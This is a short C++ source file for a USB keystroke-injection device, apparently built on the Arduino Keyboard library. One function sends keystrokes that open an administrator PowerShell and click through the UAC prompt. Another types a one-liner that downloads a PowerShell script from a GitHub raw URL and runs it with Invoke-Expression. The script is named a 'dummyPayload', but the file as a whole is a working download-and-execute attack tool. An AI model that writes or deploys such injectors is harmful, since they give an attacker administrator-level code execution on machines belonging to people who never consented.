#include <key.h>
// #include <serials.h>

KEYBOARD::KEYBOARD() {}

void KEYBOARD::up() {
    Keyboard.begin();
    delay(500);
}

void KEYBOARD::openPS() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('x');
    delay(10);
    Keyboard.releaseAll();
    delay(250);
    Keyboard.press('a');
    delay(50);
    Keyboard.release('a');
    delay(250);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');
    delay(150);
    Keyboard.releaseAll();
}

void KEYBOARD::pullScript() {
    KEYBOARD::openPS();
    delay(500);
    Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
    Serial1.println("#Roger Roger#");
}

KEYBOARD key = KEYBOARD();